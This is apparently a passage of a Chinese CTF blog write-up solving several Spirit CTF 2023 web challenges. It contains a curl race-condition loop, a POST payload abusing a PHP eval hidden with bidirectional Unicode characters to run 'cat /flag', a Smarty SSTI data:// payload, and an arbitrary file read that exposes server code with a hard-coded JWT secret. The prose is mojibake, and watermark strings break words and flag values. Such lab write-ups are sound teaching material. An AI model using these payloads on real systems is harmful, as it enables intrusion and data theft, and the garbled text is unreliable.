<h2 id="3-è§£å†³æ–¹æ¡ˆ"><a href="#3-è§£å†³æ–¹æ¡ˆ" class="headerlink" title="3. è§£å†³æ–¹æ¡ˆ"></a>3. è§£å†³æ–¹æ¡ˆ</h2><p>æ„é€ ä¸¤ä¸ªå‘åŒ…è„šæœ¬<span class="hexo-wm">ğ˜€â€Œ3ğ˜·ï½…nâ€¤â€Œâ€‹êœ±â…ˆâ€Œğ˜µâ„®â€</span>å¹¶åŒæ—¶è¿è¡Œå³å¯</p>
<p>æ³¨æ„æºå¸¦å½“å‰ä¼šè¯çš„ <code>sessionId</code> Cookies</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token keyword">while</span> <span class="token boolean">true</span>
<span class="token keyword">do</span>
<span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"sessionId=xxxx"</span> <span class="token string">"(SpiritCTF Server URL with port)/?action=buy"</span>
<span class="token keyword">done</span></code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token keyword">while</span> <span class="token boolean">true</span>
<span class="token keyword">do</span>
<span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"sessionId=xxxx"</span> <span class="token string">"(SpiritCTF Server URL with port)/?action=cutDown"</span>
<span class="token keyword">done</span></code></pre>

<p>åŒæ—¶è¿è¡Œä¸¤ä¸ªè„šæœ¬ä¸€æ®µ<span class="hexo-wm">êœ±â€Œ3vğ˜¦ğ’Â·â€ğ’”ğ˜ªâ€Œğ­ğï»¿â€‹</span>æ—¶é—´åä¼šå‘ç° <code>Flagä»·æ ¼</code> å’Œ <code>é’±åŒ…</code> éƒ½å˜æˆäº†0</p>
<p>å› æ­¤å¾—ä»¥è´­ä¹°æˆåŠŸ</p>
<p><img src="image-32.png" alt="image-32.png"></p>
<p>å¾—åˆ° <code>flag</code> å¦‚ä¸‹</p>
<blockquote>
<p>Spirit{61a9950d-<span class="hexo-wm">ğ˜€â€â€ŒÂ³ğ’—ï½…ğ§.â€Œï»¿êœ±ï½‰â€ğ˜µâ„®â€‹</span>0e0a-4141-<span class="hexo-wm">ğ˜´â€ŒÂ³ğ˜·eğ˜¯ï¼â€‹â€‹êœ±ğ¢â€â€‹ğ˜µâ„®â€‹</span>b04d-278961a87df0}</p>
</blockquote>
<h1 id="é€åˆ†ä½ è¦ä¸è¦"><a href="#é€åˆ†ä½ è¦ä¸è¦" class="headerlink" title="é€åˆ†ä½ è¦ä¸è¦>_<"></a>é€åˆ†ä½ è¦ä¸è¦&gt;_&lt;</h1><p>é¢˜ç›®æè¿°ï¼š</p>
<blockquote>
<p>è¿™æ˜¯ä¸€é“æ²¡æœ‰æ„<span class="hexo-wm">ğ¬â€‹3ğ’—eï½âˆ™â€‹<span class="hexo-wm">ğ¬â€ğŸ¯ğ’—ğğ§.ï»¿ğ’”iï»¿ï»¿ï½”eâ€Œ</span>ğ˜´ğ˜ªâ€‹ğ­eâ€Œ</span>æ€çš„ç­¾åˆ°é¢˜ğŸ˜ </p>
</blockquote>
<p>æ‰“å¼€é¡µé¢åå¾—åˆ°<span class="hexo-wm">ğ’”ï»¿â€â‘¶ğ¯ï½…ï½â€¢â€Œğ˜€â…ˆï»¿ğ˜µğ˜¦â€</span>PHPä»£ç å¦‚ä¸‹ï¼š</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// â€®â¦ Spiritâ©â¦Welcome to</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"App1eTree"</span> <span class="token operator">==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'spirit'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token string double-quoted-string">"â€®â¦Flag!â©â¦SpiritCTF"</span> <span class="token operator">==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span>â€®â¦give_youâ©â¦<span class="token number">2023</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QWQ'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æ­å–œ!flagé€ä½ å•¦"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Welcome to Spirit CTF 2023(but warm)!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script src="nonono.js"&gt;&lt;/script&gt;'</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span></code></pre>
<h2 id="1-ä¸å¯è§å­—ç¬¦è¯†åˆ«"><a href="#1-ä¸å¯è§å­—ç¬¦è¯†åˆ«" class="headerlink" title="1. ä¸å¯è§å­—ç¬¦è¯†åˆ«"></a>1. ä¸å¯è§å­—ç¬¦è¯†åˆ«</h2><p>æ ¹æ®è¯¥æ®µä»£ç ç¥å¥‡çš„é«˜äº®ï¼Œ<span class="hexo-wm">ğ˜´â€ï»¿â‘¶ğ’—ğğ˜¯Â·â€â€sï½‰ï»¿ğ˜µğ˜¦ï»¿</span>åˆ¤æ–­æ­¤å¤„å­˜åœ¨ä¸å¯è§å­—ç¬¦</p>
<p>è¿™äº›ä¸å¯è§å­—ç¬¦è°ƒæ•´<span class="hexo-wm">ğ¬â€Â³ğ¯ğnï¼ï»¿â€sï½‰â€Œï»¿teâ€â€‹</span>äº†å¯è§å­—ç¬¦çš„æ˜¾ç¤ºé¡ºåº</p>
<p>å°†ä»£ç å¤åˆ¶åˆ° <code>Visual Stuidio Code</code> ä¸­åˆ†æ</p>
<p><img src="image-33.png" alt="image-33.png"></p>
<p>å¯ä»¥çœ‹åˆ°ä¸å¯è§å­—<span class="hexo-wm">êœ±ï»¿ï»¿3â…´ğğ§ï¼ï»¿Ñ•ğ¢â€Œï½”â„®â€‹</span>ç¬¦è¢«æ˜¾ç¤ºäº†å‡ºæ¥</p>
<h2 id="2-eval-åˆ©ç”¨"><a href="#2-eval-åˆ©ç”¨" class="headerlink" title="2. eval åˆ©ç”¨"></a>2. eval åˆ©ç”¨</h2><p>æ³¨æ„åˆ°è¯¥PHPä»£ç ä½¿ç”¨äº†eval($_POST[â€˜QWQâ€™]);</p>
<p>å› æ­¤æƒ³åˆ°å¯ä»¥é€šè¿‡ <code>eval</code> å‡½æ•°æ¥æ‰§è¡Œ <code>system</code> å‘½ä»¤ <code>cat</code> å‡º <code>flag</code></p>
<h2 id="3-Payload-æ„é€ "><a href="#3-Payload-æ„é€ " class="headerlink" title="3. Payload æ„é€ "></a>3. Payload æ„é€ </h2><p>æ ¹æ®é¢˜ç›®è¦æ±‚æ„é€ PO<span class="hexo-wm">ğ˜€â€‹â‘¶ğ’—ğ˜¦ğ˜¯Â·ï»¿â€ŒÑ•iâ€Œğ˜µğâ€Œâ€‹</span>STæ•°æ®åŒ…å¦‚ä¸‹ï¼š</p>
<p><img src="image-34.png" alt="image-34.png"></p>
<h3 id="3-1-Python-requests-POST"><a href="#3-1-Python-requests-POST" class="headerlink" title="3.1 Python requests POST"></a>3.1 Python requests POST</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">"(SpiritCTF Server URL with port)"</span>
<span class="token keyword">global</span> result
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"spirit"</span><span class="token punctuation">:</span><span class="token string">"App1eTree"</span><span class="token punctuation">,</span><span class="token string">"â€®â¦give_youâ©â¦2023"</span><span class="token punctuation">:</span><span class="token string">"â€®â¦Flag!â©â¦SpiritCTF"</span><span class="token punctuation">,</span><span class="token string">"QWQ"</span><span class="token punctuation">:</span><span class="token string">'system("cat /flag");'</span><span class="token punctuation">}</span>
html <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>html<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre>

<p>å‘é€POSTæ•°æ®åŒ…åï¼Œ<span class="hexo-wm">ğ¬â€‹â‘¶ğ’—ğ˜¦nâˆ™â€‹Ñ•ğ˜ªâ€Œğ­ğâ€</span>è¿”å›å¦‚ä¸‹ä¿¡æ¯ï¼š</p>
<pre class="language-none"><code class="language-none">&lt;code&gt;&lt;span style="color: #000000"&gt;
&lt;span style="color: #0000BB"&gt;&lt;?php&lt;br /&gt;error_reporting&lt;/span&gt;&lt;span style="color: #007700"&gt;(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;0&lt;/span&gt;&lt;span style="color: #007700"&gt;);&lt;br /&gt;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;show_source&lt;/span&gt;&lt;span style="color: #007700"&gt;(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;__FILE__&lt;/span&gt;&lt;span style="color: #007700"&gt;);&lt;br /&gt;&lt;/span&gt;&lt;span style="color: #FF8000"&gt;//&nbsp;â€®â¦&nbsp;Sp
iritâ©â¦Welcome&nbsp;to&lt;br /&gt;&lt;/span&gt;&lt;span style="color: #007700"&gt;if&nbsp;(&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"App1eTree"&nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;==&nbsp;&lt;/span&gt;&lt;span style="color: #0000
BB"&gt;$_POST&lt;/span&gt;&lt;span style="color: #007700"&gt;[&lt;/span&gt;&lt;span style="color: #DD0000"&gt;'spirit'&lt;/span&gt;&lt;span style="color: #007700"&gt;]&nbsp;&amp;&amp;&nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"â€®â¦Flag!â©â¦Spiri
tCTF"&nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;==&nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$_POST&lt;/span&gt;&lt;span style="color: #007700"&gt;[&lt;/span&gt;&lt;span style="color: #0000BB"&gt;â€®â¦give_youâ©â¦2023&lt;/span&gt;&lt;span st
yle="color: #007700"&gt;])&nbsp;{&lt;br /&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;eval(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$_POST&lt;/span&gt;&lt;span style="color: #007700"&gt;[&lt;/span&gt;&lt;span style="color: #DD0000"&gt;'QWQ'&lt;/span&gt;&lt;span style="color: #007700"&gt;]);&lt;br /&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"æ­å–œ!flagé€ä½ å•¦"&lt;/span&gt;&lt;span style="color: #007700"&gt;;&lt;br /&gt;}else&nbsp;{&lt;br /&gt;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"Welcome&nbsp;to&nbsp;Spirit&nbsp;CTF&nbsp;2023(but&nbsp;warm)!"&lt;/span&gt;&lt;span style="color: #007700"&gt;;&lt;br /&gt;}&lt;br /&gt;&lt;br /&gt;echo&nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;'&lt;script&nbsp;src="nonono.js"&gt;&lt;/script&gt;'&lt;/span&gt;&lt;span style="color: #007700"&gt;;&lt;br /&gt;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;?&gt;&lt;/span&gt;
&lt;/span&gt;
&lt;/code&gt;Spirit{00e6fceb-debc-4aa6-a721-489f4da2e7f0}
æ­å–œ!flagé€ä½ å•¦&lt;script src="nonono.js"&gt;&lt;/script&gt;</code></pre>
<p>å¾—åˆ° <code>flag</code> å¦‚ä¸‹:</p>
<blockquote>
<p>Spirit{00e<span class="hexo-wm">êœ±â€Œâ‘¶ğ¯ğ˜¦ğ§âˆ™â€Œğ¬ï½‰â€‹ğ’•â„®â€‹â€</span>6fceb-debc-<span class="hexo-wm">êœ±ï»¿â€â‘¶â…´â„¯ï½âˆ™ï»¿êœ±ğ¢â€Œï½”ğâ€Œ</span>4aa6-a721-489f4da2e7f0}</p>
</blockquote>
<h1 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h1><p>é¢˜ç›®æè¿°ï¼š</p>
<blockquote>
<p>R U SMART <span class="hexo-wm">êœ±ï»¿â€‹3ğ˜·ï½…ğ§ï¼â€sï½‰ï»¿ğ’•eï»¿</span>ENOUGH www</p>
</blockquote>
<p>æ‰“å¼€é¡µé¢åå‘ç°æœ‰å¾ˆå¤šé¢˜ç›®</p>
<p><img src="image-35.png" alt="image-35.png"></p>
<p>ç»“åˆé¢˜ç›®æ ‡é¢˜ <code>ssti</code> å’Œ é¢˜ç›®æè¿° <code>SMART</code></p>
<p>å¯ä»¥åˆ¤æ–­å‡ºè¯¥é¢˜ä¸º <code>Smartyçš„SSTIæ¨¡ç‰ˆæ³¨å…¥</code></p>
<p><del>æ˜¯è°åšå®Œäº†æ‰€æœ‰é¢˜ç›®æ‰å‘ç°æ˜¯ <span class="hexo-wm">Ñ•â€3â…´ğ˜¦n.â€â€Œğ˜€ğ˜ªâ€Œâ€ğ˜µğ˜¦â€â€Œ</span>SSTI æˆ‘ä¸è¯´</del></p>
<p>éšæ„ç‚¹å‡»ä¸€ä¸ª <code>challenge</code> ï¼Œå‘ç°é¡µé¢è·³è½¬åˆ°äº† <code>/challenges.php?name=xxxx</code> ,</p>
<p>ç”±æ­¤åˆ¤æ–­åç«¯ä¼šä½¿ç”¨æ–‡ä»¶è¯»å–å‡½æ•°è¯»å–åå­—ä¸º <code>xxxx</code> çš„æ¨¡ç‰ˆæ–‡ä»¶å¹¶æ¸²æŸ“åˆ°å‰ç«¯</p>
<p>åˆ©ç”¨ <code>data</code> ä¼ªåè®®æ„é€  <code>payload</code> å¦‚ä¸‹ï¼š</p>
<pre class="language-none"><code class="language-none">/challenges.php?name=data://text/plain,{$smarty.env.FLAG}</code></pre>

<p>å³å¯å°† <code>smarty</code> çš„ç¯å¢ƒå˜é‡ <code>FLAG</code> æ˜¾ç¤ºåˆ°å‰ç«¯</p>
<p><img src="image-36.png" alt="image-36.png"></p>
<p>å¾—åˆ° <code>flag</code> å¦‚ä¸‹ï¼š</p>
<pre class="language-none"><code class="language-none">Spirit{f94322ca-2c8f-4dc3-87f4-ec75d4c7bbbc}</code></pre>

<h1 id="ä½ å–œæ¬¢é¸£æ¿‘ç™½ç¾½å—"><a href="#ä½ å–œæ¬¢é¸£æ¿‘ç™½ç¾½å—" class="headerlink" title="ä½ å–œæ¬¢é¸£æ¿‘ç™½ç¾½å—"></a>ä½ å–œæ¬¢é¸£æ¿‘ç™½ç¾½å—</h1><p>é¢˜ç›®æè¿°ï¼š</p>
<blockquote>
<p>ä¸å–œæ¬¢é¸£æ¿‘ç™½ç¾½(?<span class="hexo-wm">ğ¬â€â€Â³ğ¯â„¯ğ’âˆ™â€Œsğ¢â€Œï»¿ğ˜µâ„®ï»¿</span>)çš„æ˜¯ä¸èƒ½æ‹¿åˆ°flagçš„ğŸ˜˜ <del>æœ€å¥½ç”¨ç«ç‹æµè§ˆ<span class="hexo-wm">ğ’”â€‹â€â‘¶veï½.â€‹ğ˜€iâ€‹teâ€Œï»¿</span>å™¨æ‰“å¼€æŠ“åŒ…ï¼Œç”¨bp</del> (å·²ç»æ¢å¤äº†)</p>
</blockquote>
<p>æ‰“å¼€é¡µé¢åå‘ç°æ˜¯<span class="hexo-wm">ğ˜€â€‹â€Œâ‘¶ğ˜·ğ˜¦ï½ï¼â€‹â€ğ’”ğ˜ªï»¿ğ’•â„®â€‹</span>ä¸€ä¸ªå›¾åº“ç®¡ç†ä¸‹è½½ç³»ç»Ÿ</p>
<p><img src="image-37.png" alt="image-37.png"></p>
<h2 id="1-ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´"><a href="#1-ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´" class="headerlink" title="1. ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´"></a>1. ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</h2><p>ç‚¹å‡» <code>Download</code> æŒ‰é’®ï¼Œå‘ç°é¡µ<span class="hexo-wm">ğ˜´ï»¿â€‹ğŸ¯ğ’—eğ˜¯â€¢â€ğ¬ğ¢â€â€ğ˜µâ„®ï»¿ï»¿</span>é¢è·³è½¬åˆ°äº† <code>/download?filename=xxxx</code></p>
<p>ç»è¿‡æµ‹è¯•å‘ç° <code>filename</code> å­—æ®µå­˜åœ¨ä»»æ„<span class="hexo-wm">ğ’”â€Œ3ğ¯ğğ’â€¤â€sï½‰â€‹ï½”ğ˜¦â€‹</span>æ–‡ä»¶è¯»å–æ¼æ´</p>
<p>è®¿é—® <code>/download?filename=/proc/self/cmdline</code> ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">python /app/Nanami.py</code></pre>
<p>æ ¹æ®æœåŠ¡ç«¯ä»£ç è·¯å¾„è®¿é—® <code>/download?filename=/app/Nanami.py</code>,</p>
<p>å¾—åˆ°æœåŠ¡ç«¯ä»£ç å¦‚ä¸‹ï¼š</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> mimetypes
<span class="token keyword">import</span> os
<span class="token keyword">import</span> subprocess
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template
<span class="token keyword">import</span> jwt
<span class="token keyword">import</span> logging

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

SECRET_KEY <span class="token operator">=</span> <span class="token string">"I_LIKE_Aoyama_Nanami"</span>
logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'error.log'</span><span class="token punctuation">,</span> level<span class="token operator">=</span>logging<span class="token punctuation">.</span>ERROR<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> token<span class="token punctuation">:</span>
        token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'guest'</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> SECRET_KEY<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span>
    
    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token keyword">not</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        response<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">,</span> token<span class="token punctuation">,</span> httponly<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> samesite<span class="token operator">=</span><span class="token string">'Lax'</span><span class="token punctuation">)</span>  

    <span class="token keyword">return</span> response

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/download'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> token<span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            data <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> SECRET_KEY<span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'HS256'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            username <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>

    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">,</span> <span class="token string">'1.jpg'</span><span class="token punctuation">)</span>
    filepath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'static/images'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
    <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token keyword">and</span> filename <span class="token operator">==</span> <span class="token string">"yuanshen?qidong!"</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            output <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/readflag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> subprocess<span class="token punctuation">.</span>CalledProcessError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"Error executing /readflag: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">:</span>
        mime_type<span class="token punctuation">,</span> encoding <span class="token operator">=</span> mimetypes<span class="token punctuation">.</span>guess_type<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>
        <span class="token keyword">if</span> mime_type <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            mime_type <span class="token operator">=</span> <span class="token string">'application/octet-stream'</span>
        
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
            response <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> mime_type<span class="token punctuation">)</span>
            response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'attachment; filename=</span><span class="token interpolation"><span class="token punctuation">{</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>basename<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> response
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"File not found."</span><span class="token punctuation">,</span> <span class="token number">404</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">internal_server_error</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>logger<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">'Server Error: %s'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">"å¥½åƒæœ‰ä»€ä¹ˆé”™è¯¯å–µ!"</span><span class="token punctuation">,</span> <span class="token number">500</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
</code></pre>
<p>åˆ†æä»£ç åå‘ç°åªæœ‰æ»¡<span class="hexo-wm">êœ±â€‹Â³ğ¯eğ˜¯â€¤â€â€Œsğ¢ï»¿ï½”ğâ€â€Œ</span>è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶æ‰èƒ½è°ƒç”¨ <code>/readflag</code> subprocess æ¥è¯»å–flagï¼š</p>
<ul>
<li>Cookies <code>auth</code> ç»è¿‡ jwt<span class="hexo-wm">ğ˜€â€â€‹3ğ˜·eï½Â·ï»¿ï»¿ğ˜€ï½‰â€ğ­â„®â€Œ</span> è§£æååŒ…å« <code>{"username":"admin"}</code> å­—æ®µ</li>
<li>filename çš„ <span class="hexo-wm">ğ’”â€‹â€Œ3ğ˜·ğnï¼ï»¿ğ¬â…ˆâ€Œğ’•ğ˜¦â€‹</span>GET ä¼ å‚ä¸º <code>yuanshen?qidong!</code></li>
</ul>
<h2 id="2-JWT-Json-Web-Tokens"><a href="#2-JWT-Json-Web-Tokens" class="headerlink" title="2. JWT (Json Web Tokens)"></a>2. JWT (Json Web Tokens)</h2><p>ä» F12 å¼€å‘äººå‘˜å·¥å…·ä¸­æ‰¾åˆ°å½“å‰ <span class="hexo-wm">ğ’”â€3ğ˜·ğğ˜¯â€¤ï»¿â€‹êœ±ï½‰â€Œâ€‹tâ„®â€Œâ€‹</span>Cookies <code>auth</code> çš„å€¼</p>
<p><img src="image-38.png" alt="image-38.png"></p>
<pre class="language-none"><code class="language-none">auth = eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.6tqEhsR0SEHG-GL7hEar5Ewi2dQbGSEz-3NoPrZxi1Y</code></pre>

<h3 id="2-1-JWT-çš„ç»„æˆ"><a href="#2-1-JWT-çš„ç»„æˆ" class="headerlink" title="2.1 JWT çš„ç»„æˆ"></a>2.1 JWT çš„ç»„æˆ</h3><p><img src="image-39.png" alt="image-39.png"></p>
<p>JWT é€šå¸¸æ˜¯ä¸€ä¸ªå¾ˆé•¿çš„å­—<span class="hexo-wm">ğ˜€â€ğŸ¯ğ’—ï½…ï½Â·â€â€‹êœ±ğ¢ï»¿â€ğ­ğâ€</span>ç¬¦ä¸²ï¼Œä¸­é—´ç”¨ä¸¤ä¸ª <code>.</code> åˆ†éš”æˆä¸‰ä¸ªéƒ¨åˆ†ï¼Œä¾æ¬¡ä¸ºï¼š</p>
<ul>
<li>Headerï¼ˆå¤´éƒ¨ï¼‰</li>
<li>Payloadï¼ˆè´Ÿè½½ï¼‰</li>
<li>Signatu<span class="hexo-wm">ğ’”ï»¿ï»¿Â³â…´ğğ˜¯â€¤ï»¿ğ˜€ğ¢â€‹ğ­ğ˜¦â€‹</span>reï¼ˆç­¾åï¼‰</li>
</ul>
<p>è¯¥å­—ç¬¦ä¸²åº”å½¢å¦‚ï¼šHeader.Payload.<span class="hexo-wm">êœ±ï»¿â€Œ3vï½…nâ€¤â€Œâ€sğ˜ªï»¿ğ­ï½…â€‹â€‹</span>Signature</p>
<p>ä¸‹é¢å°†åˆ†åˆ«è§£é‡Šä¸‰ä¸ªéƒ¨åˆ†<span class="hexo-wm">ğ’”â€ŒÂ³â…´eğ˜¯â€¤â€‹ï»¿ğ˜´â…ˆâ€teâ€Œ</span>çš„å†…å®¹åŠå…¶ä½œç”¨ï¼š</p>
